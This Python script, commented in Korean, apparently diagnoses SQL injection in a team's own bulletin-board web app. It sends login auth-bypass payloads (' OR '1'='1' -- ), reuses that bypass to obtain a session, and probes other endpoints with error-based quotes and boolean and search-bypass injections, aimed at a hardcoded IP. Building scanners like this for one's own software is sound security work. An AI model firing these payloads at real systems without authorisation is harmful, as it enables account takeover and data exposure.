"""
Stage 6: SQL Injection Diagnosis
- 팀 게시판(web/app.py)에서 수동 체크리스트로 확인된 SQLi 지점을 자동 진단
- SSRF 파이프라인(stage1~5)과 달리 대상 엔드포인트가 여러 개로 흩어져 있어서
  파라미터/싱크를 자동 탐색하지 않고, 확인된 후보(CANDIDATES)를 직접 정의해서 사용.

v2 변경점:
- requests.Session()으로 통일 → 로그인 세션 쿠키를 이후 요청에 계속 사용
- 시작 시 /login 의 인증 우회 SQLi(' OR '1'='1' -- )로 자동 로그인 부트스트랩
  → needs_auth=True인 후보(/post/new 등)도 세션이 있는 상태로 정상 진단 가능
- boolean_based 테스트에 실제 전송된 최종 URL을 evidence에 남겨서 디버깅 용이하게 함

사용법 (단독 실행):
    python stage6_sqli_diagnosis.py http://52.78.187.138:5000

main.py 파이프라인과는 별도 스크립트로 분리 (인터페이스가 안 맞아서).
결과 JSON은 stage3와 최대한 비슷한 스키마로 맞춤 → 리포트/대시보드 재사용 목적.
"""
import argparse
import json
import sys
import requests


# ── 탐지 시그니처 ────────────────────────────────────────────────
# 1순위: DB 에러/트레이스백 노출 시그니처 (에러 기반 SQLi 확정)
ERROR_SIGNATURES = [
    "operationalerror", "sqlite3", "syntax error", "traceback",
    "sql", "unrecognized token", "near \"",
]

# 2순위: 로그인 성공(인증 우회) 시그니처 — 응답 본문 또는 리다이렉트/쿠키로 판단
LOGIN_SUCCESS_SIGNATURES = [
    "로그아웃", "logout", "환영합니다",
]


# ── 진단 후보 목록 (체크리스트로 수동 확인 완료된 엔드포인트) ──────
# location: "form" (POST body) | "query" (GET 쿼리) | "path" (URL 경로)
# technique: 이 후보에 적용할 탐지 기법
# needs_auth: True면 진단 전 로그인 세션이 있어야 진짜 취약 코드에 도달함
CANDIDATES = [
    {
        "endpoint": "/login",
        "method": "POST",
        "location": "form",
        "param": "password",
        "fixed_fields": {"username": "probe_user"},
        "technique": "auth_bypass",
        "needs_auth": False,
    },
    {
        "endpoint": "/register",
        "method": "POST",
        "location": "form",
        "param": "username",
        "fixed_fields": {"password": "probe_pw"},
        "technique": "error_based",
        "needs_auth": False,
    },
    {
        "endpoint": "/post/{value}",
        "method": "GET",
        "location": "path",
        "param": "pid",
        "fixed_fields": {},
        "technique": "boolean_based",
        "boolean_pair": ("1 AND 1=1", "1 AND 1=2"),
        "needs_auth": False,
    },
    {
        "endpoint": "/search",
        "method": "GET",
        "location": "query",
        "param": "q",
        "fixed_fields": {},
        "technique": "boolean_based_search",
        "needs_auth": False,
    },
    {
        "endpoint": "/post/new",
        "method": "POST",
        "location": "form",
        "param": "title",
        "fixed_fields": {"content": "probe_content"},
        "technique": "error_based",
        "needs_auth": True,   # session["username"] 없으면 /login 으로 리다이렉트됨
    },
]


def _bootstrap_login(session: requests.Session, base_url: str, timeout: int) -> bool:
    """
    /login 의 인증 우회 SQLi(' OR '1'='1' -- )로 세션을 확보.
    별도 계정 정보 없이도 needs_auth 후보들을 테스트할 수 있게 해줌.
    (이 자체가 이미 확정된 취약점이라 재사용하는 것 — 실패해도 파이프라인은 계속 진행)
    """
    url = base_url + "/login"
    data = {"username": "probe_user", "password": "' OR '1'='1' -- "}
    try:
        r = session.post(url, data=data, timeout=timeout, allow_redirects=True)
    except requests.RequestException as e:
        print(f"[!] 로그인 부트스트랩 실패: {e}", file=sys.stderr)
        return False

    ok = _find_signature(r.text, LOGIN_SUCCESS_SIGNATURES) is not None
    print(f"[*] 로그인 부트스트랩 {'성공' if ok else '실패'} (needs_auth 후보 테스트용)",
          file=sys.stderr)
    return ok


def run_sqli_diagnosis(base_url: str, request_timeout: int = 10) -> list:
    """CANDIDATES를 순회하며 각 엔드포인트에 SQLi 진단 시도."""
    base_url = base_url.rstrip("/")
    results = []
    session = requests.Session()

    logged_in = _bootstrap_login(session, base_url, request_timeout)

    for cand in CANDIDATES:
        technique = cand["technique"]

        if cand.get("needs_auth") and not logged_in:
            results.append({
                "target": base_url + cand["endpoint"],
                "endpoint": cand["endpoint"],
                "parameter": {
                    "name": cand["param"],
                    "method": cand["method"],
                    "location": cand["location"],
                },
                "tests": [],
                "result": "unknown",
                "note": "로그인 세션 확보 실패로 테스트 스킵 (needs_auth=True)",
            })
            continue

        if technique == "auth_bypass":
            tests, vulnerable = _test_auth_bypass(session, base_url, cand, request_timeout)
        elif technique == "error_based":
            tests, vulnerable = _test_error_based(session, base_url, cand, request_timeout)
        elif technique == "boolean_based":
            tests, vulnerable = _test_boolean_based_path(session, base_url, cand, request_timeout)
        elif technique == "boolean_based_search":
            tests, vulnerable = _test_boolean_based_search(session, base_url, cand, request_timeout)
        else:
            tests, vulnerable = [], False

        results.append({
            "target": base_url + cand["endpoint"],
            "endpoint": cand["endpoint"],
            "parameter": {
                "name": cand["param"],
                "method": cand["method"],
                "location": cand["location"],
            },
            "tests": tests,
            "result": "vulnerable" if vulnerable else "safe",
        })

    return results


# ── 기법별 테스트 함수 (모두 session을 받아서 쿠키 유지) ────────────

def _test_error_based(session: requests.Session, base_url: str, cand: dict, timeout: int) -> tuple:
    """param에 ' 하나 넣어서 에러 시그니처 뜨는지 확인."""
    url = base_url + cand["endpoint"]
    payload = "'"
    data = {**cand["fixed_fields"], cand["param"]: payload}

    try:
        if cand["method"] == "POST":
            r = session.post(url, data=data, timeout=timeout)
        else:
            r = session.get(url, params=data, timeout=timeout)
        body = r.text
    except requests.RequestException as e:
        return [{"technique": "error_based", "payload": payload,
                  "vulnerable": False, "evidence": f"[req error] {e}"}], False

    hit = _find_signature(body, ERROR_SIGNATURES)
    test = {
        "technique": "error_based",
        "payload": payload,
        "final_url": r.url,
        "status_code": r.status_code,
        "vulnerable": hit is not None,
        "evidence": hit or body[:200],
    }
    return [test], hit is not None


def _test_auth_bypass(session: requests.Session, base_url: str, cand: dict, timeout: int) -> tuple:
    """password 필드에 ' OR '1'='1' -- 넣어서 인증 우회되는지 확인."""
    url = base_url + cand["endpoint"]
    payload = "' OR '1'='1' -- "
    data = {**cand["fixed_fields"], cand["param"]: payload}

    try:
        r = session.post(url, data=data, timeout=timeout, allow_redirects=True)
        body = r.text
    except requests.RequestException as e:
        return [{"technique": "auth_bypass", "payload": payload,
                  "vulnerable": False, "evidence": f"[req error] {e}"}], False

    # 로그인 성공 시그니처가 뜨거나, 세션 쿠키가 새로 생기면 우회 성공으로 판정
    hit = _find_signature(body, LOGIN_SUCCESS_SIGNATURES)
    got_session_cookie = any("session" in c.lower() for c in session.cookies.keys())
    vulnerable = hit is not None or got_session_cookie

    test = {
        "technique": "auth_bypass",
        "payload": payload,
        "final_url": r.url,
        "status_code": r.status_code,
        "vulnerable": vulnerable,
        "evidence": hit or (f"session cookie set: {list(session.cookies.keys())}"
                             if got_session_cookie else body[:200]),
    }
    return [test], vulnerable


def _test_boolean_based_path(session: requests.Session, base_url: str, cand: dict, timeout: int) -> tuple:
    """URL 경로 파라미터에 AND 1=1 / AND 1=2 넣어서 응답 차이 비교."""
    true_val, false_val = cand["boolean_pair"]
    endpoint_template = cand["endpoint"]
    tests = []

    url_true = base_url + endpoint_template.format(value=true_val)
    url_false = base_url + endpoint_template.format(value=false_val)

    try:
        r_true = session.get(url_true, timeout=timeout)
        r_false = session.get(url_false, timeout=timeout)
    except requests.RequestException as e:
        return [{"technique": "boolean_based", "vulnerable": False,
                  "evidence": f"[req error] {e}"}], False

    # 에러 시그니처가 바로 뜨는 경우도 확정
    err_hit = _find_signature(r_true.text, ERROR_SIGNATURES) or \
              _find_signature(r_false.text, ERROR_SIGNATURES)

    # "게시글이 존재하지 않습니다" 같은 앱 자체 404는 정상 동작이므로,
    # true 케이스가 진짜 콘텐츠를 반환했는지(= false와 다른지)로만 판단
    differs = (r_true.status_code != r_false.status_code) or \
              (r_true.text.strip() != r_false.text.strip())

    vulnerable = differs or (err_hit is not None)

    tests.append({
        "technique": "boolean_based",
        "payload_true": true_val,
        "payload_false": false_val,
        "final_url_true": r_true.url,
        "final_url_false": r_false.url,
        "status_true": r_true.status_code,
        "status_false": r_false.status_code,
        "body_true_snippet": r_true.text[:150],
        "body_false_snippet": r_false.text[:150],
        "vulnerable": vulnerable,
        "evidence": err_hit or (
            "true/false 응답이 다름 (콘텐츠 존재 여부로 SQLi 확정)" if differs
            else "응답 동일 — 취약 아님 (final_url_true/false와 body 스니펫으로 원인 확인 가능)"
        ),
    })
    return tests, vulnerable


def _test_boolean_based_search(session: requests.Session, base_url: str, cand: dict, timeout: int) -> tuple:
    """/search?q=' OR '1'='1 넣어서 전체 결과가 다 나오는지 확인 (LIKE절 우회)."""
    url = base_url + cand["endpoint"]

    try:
        r_baseline = session.get(url, params={"q": "존재하지않는검색어zzz"}, timeout=timeout)
        r_payload = session.get(url, params={"q": "' OR '1'='1"}, timeout=timeout)
    except requests.RequestException as e:
        return [{"technique": "boolean_based_search", "vulnerable": False,
                  "evidence": f"[req error] {e}"}], False

    err_hit = _find_signature(r_payload.text, ERROR_SIGNATURES)

    # payload 응답의 결과 개수(<li> 태그 등)가 baseline보다 훨씬 많으면 LIKE절 우회로 판정
    baseline_count = r_baseline.text.count("<li>")
    payload_count = r_payload.text.count("<li>")
    bypassed = payload_count > baseline_count

    vulnerable = bypassed or (err_hit is not None)

    test = {
        "technique": "boolean_based_search",
        "payload": "' OR '1'='1",
        "final_url": r_payload.url,
        "baseline_result_count": baseline_count,
        "payload_result_count": payload_count,
        "vulnerable": vulnerable,
        "evidence": err_hit or (
            f"전체 결과 노출 (baseline {baseline_count}건 → payload {payload_count}건)"
            if bypassed else "검색어 무관 결과 증가 없음 — 취약 아님"
        ),
    }
    return [test], vulnerable


def _find_signature(body: str, signatures: list):
    """body에서 시그니처 목록 중 처음 매칭되는 것 반환 (없으면 None)."""
    if not body:
        return None
    lowered = body.lower()
    for s in signatures:
        if s.lower() in lowered:
            return s
    return None


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("target", help="진단 대상 base URL (예: http://52.78.187.138:5000)")
    ap.add_argument("--output", "-o", help="결과 JSON 저장 경로 (미지정시 stdout)")
    args = ap.parse_args()

    results = run_sqli_diagnosis(args.target)
    vuln_cnt = sum(1 for r in results if r["result"] == "vulnerable")
    print(f"[*] SQLi 진단 완료 — vulnerable: {vuln_cnt} / {len(results)}", file=sys.stderr)

    out = json.dumps(results, indent=2, ensure_ascii=False)
    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            f.write(out)
        print(f"[+] 저장: {args.output}", file=sys.stderr)
    else:
        print(out)
